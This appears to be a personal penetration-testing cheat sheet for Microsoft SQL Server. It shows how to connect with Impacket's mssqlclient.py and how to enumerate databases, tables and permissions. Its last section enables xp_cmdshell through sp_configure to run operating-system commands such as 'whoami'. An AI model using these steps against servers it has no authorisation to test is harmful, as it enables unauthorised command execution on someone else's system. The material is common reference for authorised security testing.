# MSSQL
**Using some Impacket tools**

## Connecting
```bash
mssqlclient.py <user>@<% tp.frontmatter.target_ip %> -windows-auth
```

### Database enumeration
**After being connected**
```bash
select name from sys.databases 
```

```bash
EXEC sp_databases
```

```bash
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

```bash
SELECT name FROM master.sys.databases
```

**Switch DBs**
```bash
use <db>
```

```bash
SELECT name FROM sysobjects WHERE xtype = 'U'
```

**Show all tables of DB**
```bash
SELECT * FROM <db_NAME>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
```

### Code execution
**You don't always have permissions, but good to try**

```bash
EXEC sp_configure 'show advanced options', '1'
```

```bash
RECONFIGURE
```

```bash
EXEC sp_configure 'xp_cmdshell', '1' 
```

```bash
RECONFIGURE
```

**Example of code execution (If the above commands work)**
```bash
xp_cmdshell "whoami"
```

